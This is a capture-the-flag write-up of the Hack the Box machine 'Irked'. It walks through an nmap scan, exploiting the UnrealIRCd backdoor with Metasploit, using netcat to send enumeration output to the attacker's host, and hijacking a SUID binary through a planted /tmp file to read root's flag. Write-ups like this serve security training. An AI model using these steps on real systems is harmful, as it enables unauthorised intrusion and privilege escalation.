<p align="center">
  <img src="https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Irked/Screenshots/irked.png" alt="Irked"/>
</p>

## Enumeration

\
Start with a detailed nmap scan

```
nmap -vv -Pn --disable-arp-ping -sS -A -sC -p- -T 3 -script-args=unsafe=1 -n 10.10.10.117
```
```
Nmap scan report for 10.10.10.117
Host is up, received user-set (0.18s latency).
Scanned at 2019-03-24 14:14:20 EDT for 1456s
Not shown: 65528 closed ports
Reason: 65528 resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          40600/udp  status
|_  100024  1          57751/tcp  status
6697/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
8067/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
57751/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
65534/tcp open  irc     syn-ack ttl 63 UnrealIRCd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=3/24%OT=22%CT=1%CU=34616%PV=Y%DS=2%DC=T%G=Y%TM=5C97CEA
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 0.066 days (since Sun Mar 24 13:04:10 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   174.13 ms 10.10.12.1
2   174.41 ms 10.10.10.117

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/su
```

## Exploitation 

\
I first looked at UnrealIRCd in exploitdb:

![searchsploit]()

\
Lets test out the [metasploit exploit](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor), which exploits a backdoor in Unreal IRCD 3.2.8.1:
```
msf5 > use exploit/unix/irc/unreal_ircd_3281_backdoor
```

![msf]()

\
We got an meterpreter shell!  Type shell  so that you get an interactive shell then /bin/bash to get a bash shell:

![shell]()

\
Now looking in the home directories, we cannot open the file user.txt because we are not the user djmardov:

![user]()

\
There is also a backup file in the user;s home directory:

![backup]()

\
Let's keep this passwordin mind for later.  Next I transferred LinEnum to the target machine using netcat, sent the output to a text file, then sent it back to my attacking machine for analysis:

```
nc -nlvp 4444 > LinEnum.sh

nc -nv 10.10.10.117 4444 < LinEnum.sh

nhmod +x LinEnum.sh

./LinEnum.sh > LinEnum.txt

nc -nv 10.10.14.201 4444 < LinEnum.txt

nc -nlvp 4444 > LinEnum.txt
```

Let's look at some of the results:

![linenum]()

\
From this list with the SUID bit set, viewuser is not a binary that normally has the SUID bit set.  Use strings on the binary to see what it does:
```
strings /usr/bin/viewuser
```

![viewuser]()

\
This shows a file in /tmp called listusers that it executes. The file does not exist in tmp, so lets make one so that it reads the users.txt and root .txt files :

```
ircd@irked:/tmp$ touch listusers
ircd@irked:/tmp$ echo "cat /home/djmardov/Documents/user.txt" > listusers
ircd@irked:/tmp$ echo "cat /root/root.txt" >> listusers
```

## User and Root Files 

\
Now execute viewuser and we get the user.txt and root.txt files:

![files]()

